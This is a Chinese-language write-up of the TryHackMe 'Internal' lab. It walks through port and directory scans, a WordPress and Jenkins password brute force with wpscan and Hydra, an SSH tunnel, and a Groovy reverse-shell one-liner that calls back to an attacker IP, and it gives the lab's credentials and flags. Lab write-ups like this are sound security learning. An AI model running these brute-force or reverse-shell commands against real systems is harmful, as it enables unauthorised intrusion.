---
title: THM Internal
published: 2025-07-10
tags: [THM]
category: Cyber Security
draft: false
image: 'image.png'
---


## Recon

```bash=
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -Pn 10.10.136.249
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 23:48 EDT
Nmap scan report for 10.10.136.249
Host is up (0.36s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.20 seconds
```



## Exploit

依據題目先把 `internal.thm` 加上去 `/etc/hosts`

![image](https://hackmd.io/_uploads/r11UUwoSle.png)

![image](https://hackmd.io/_uploads/B1m0IwsBxx.png)


gobuster 先掃路徑

```bash=
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 'http://10.10.136.249/' -w /usr/share/wordlists/dirb/common.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.136.249/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/blog                 (Status: 301) [Size: 313] [--> http://10.10.136.249/blog/]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.136.249/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.136.249/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.136.249/wordpress/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

順便來看看 subdomain 有哪些

```bash=
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u 'internal.thm' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 --append-domain --timeout 20s
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://internal.thm
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         20s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.internal.thm Status: 400 [Size: 422]
Found: _domainkey.internal.thm Status: 400 [Size: 422]
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```

到路徑 `/blog` 發現他的 framework 是 wordpress

![image](https://hackmd.io/_uploads/ryC9wPjSlx.png)

用 `wpscan` 掃看看

```bash=
┌──(kali㉿kali)-[~]
└─$ wpscan --url "http://internal.thm/blog/wp-login.php" -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/wp-login.php/ [10.10.136.249]
[+] Started: Tue Jul  8 23:58:29 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://internal.thm/blog/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://internal.thm/blog/wp-includes/css/dashicons.min.css?ver=5.4.2
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://internal.thm/blog/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-includes/js/wp-util.min.js?ver=5.4.2
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://internal.thm/blog/wp-includes/css/dashicons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-admin/css/forms.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-admin/css/l10n.min.css?ver=5.4.2

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jul  8 23:58:45 2025
[+] Requests Done: 44
[+] Cached Requests: 4
[+] Data Sent: 12.47 KB
[+] Data Received: 150.311 KB
[+] Memory used: 235.203 MB
[+] Elapsed time: 00:00:15
```

目前知道 wordpress version 是 `5.4.2` 去找找看有沒有 cve，看起來沒

所以這邊把目標轉向 phpmyadmin，將他路徑再掃一次

```bash=
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 'http://10.10.136.249/phpmyadmin' -w /usr/share/wordlists/dirb/common.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.136.249/phpmyadmin
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/doc                  (Status: 301) [Size: 323] [--> http://10.10.136.249/phpmyadmin/doc/]
/favicon.ico          (Status: 200) [Size: 22486]
/index.php            (Status: 200) [Size: 10531]
/js                   (Status: 301) [Size: 322] [--> http://10.10.136.249/phpmyadmin/js/]
/libraries            (Status: 403) [Size: 278]
/locale               (Status: 301) [Size: 326] [--> http://10.10.136.249/phpmyadmin/locale/]
/phpinfo.php          (Status: 200) [Size: 10533]
/setup                (Status: 401) [Size: 460]
/sql                  (Status: 301) [Size: 323] [--> http://10.10.136.249/phpmyadmin/sql/]
/templates            (Status: 403) [Size: 278]
/themes               (Status: 301) [Size: 326] [--> http://10.10.136.249/phpmyadmin/themes/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```


參考這篇取得 phpmyadmin 的版本

https://developer.volcengine.com/articles/7381508864484573222

![image](https://hackmd.io/_uploads/B12KjPsrxg.png)

![image](https://hackmd.io/_uploads/BkQqsDirlg.png)


由於怎麼試都沒有結果，這邊跑去看 wp，發現自己被搞ㄌQQ，簡單說一下原因，wpscan 掃描的部分可以去 `/blog` 的路徑直接掃，不用去登入的頁面，還有使用者可以用 `u` 去試試看，


![image](https://hackmd.io/_uploads/S1Hs1OjBlg.png)

重新掃過之後我們會發現多一個 `admin` 的 username，現在可以用 wpscan 去爆看看 `wp-login` 的密碼

![image](https://hackmd.io/_uploads/HJH6GujBee.png)


爆破成功

![image](https://hackmd.io/_uploads/BJm0Mdirxg.png)


用 `admin` , `my2boys` 去登入，登進去就好做了，可以去 theme editor 上傳 php reversed shell

![Screenshot 2025-07-09 at 5.11.39 PM](https://hackmd.io/_uploads/Skt8fnjBee.png)

對，改完之後還因為 Server 是 Apache ，觸發他自己的 404 ，反正最後就是去 post 上隨便輸入路徑就會讓他噴 404 error 了QQ

![Screenshot 2025-07-09 at 5.13.03 PM](https://hackmd.io/_uploads/SJsjMhsBgg.png)

這邊看到使用者是 `aubreanna` ，感覺又是要 ssh 到他的帳號才可以繼續提權

![Screenshot 2025-07-09 at 5.13.35 PM](https://hackmd.io/_uploads/HkqaGhsrxx.png)


這邊照之前被搞過的邏輯，去 /opt 上面找，然後就找到ㄌ ，好爽

```bash=

$ cd opt
$ ls -al
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

> Get Flag1 : THM{int3rna1_fl4g_1}

接下來就來研究怎麼提權吧

```bash=
aubreanna@internal:~$ sudo -l
[sudo] password for aubreanna: 
Sorry, user aubreanna may not run sudo on internal.
aubreanna@internal:~$ sudo -i
[sudo] password for aubreanna: 
aubreanna is not in the sudoers file.  This incident will be reported.
```

測試下來發現 sudo 大法失效，去看看 suid 大法

```bash=
aubreanna@internal:~$ find / -type f -perm -4000 2>/dev/null
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

看起來也沒辦法，但是在原本的目錄看到一些酷東西，我猜可能是 port fordwarding 之類的考法


![Screenshot 2025-07-09 at 5.25.15 PM](https://hackmd.io/_uploads/HkFYBhsHle.png)


看完 wp 之後發現真的是，但是因為自己對 port forwarding 不熟，所以這邊就照 wp 的做就好了， 

先

```bash=
ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.104.22
```

之後去 localhost:8080 看就成功了，註: tunnel 的部分盡量 port 選一樣的

![Screenshot 2025-07-09 at 10.19.59 PM](https://hackmd.io/_uploads/rJoccx3Bxl.png)

成功，去查 jenkins 的 default username 跟 password ，發現 username 是 admin ，但密碼是亂數，所以就開始利用 hydra 的 error message 功能去爆破

```bash=
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.104.22 http-post-form "/login:username=^USER^&password=^PASS^:Invalid username or password" -vV
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-09 10:35:52
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.104.22:80/login:username=^USER^&password=^PASS^:Invalid username or password
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.104.22 - login "admin" - pass "abc123" - 10 of 14344399 [child 9] (0/0)

```

![Screenshot 2025-07-09 at 10.57.37 PM](https://hackmd.io/_uploads/ByavXWhHgg.png)

dirsearch 掃下去發現有路徑 `/oops`


![Screenshot 2025-07-09 at 10.58.18 PM](https://hackmd.io/_uploads/ByIcQbhSex.png)

連上去可以看到 jenkins 的版本是 `2.250`，去找看看有沒有 exploit ，結果看起來都沒QQ

回過頭來去看 wp 發現是自己的 hydra 指令下錯了，其實他在送登入的時候有這一些參數

![Screenshot 2025-07-09 at 11.29.05 PM](https://hackmd.io/_uploads/B1a65b3Sle.png)

這一坨砸下去，就可以 get password 了

```bash=
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-09 11:31:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-09 11:31:51
```

`admin`:`spongebob`登進去之後找到 script console ，用學長推薦的工具生出 exploit https://www.revshells.com/


```bash=
String host="10.17.9.114";int port=6969;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

連進去之後經過一番通靈，在 /opt 找到 note.txt 

![Screenshot 2025-07-09 at 11.42.16 PM](https://hackmd.io/_uploads/BkL1RW3Sgl.png)

之後就 get root 了 

> Get Flag2: THM{d0ck3r_d3str0y3r}

## Pwned!

真的是把能踩的坑全部採過一遍了

![Screenshot 2025-07-09 at 11.45.05 PM](https://hackmd.io/_uploads/HkJ9RbhSel.png)
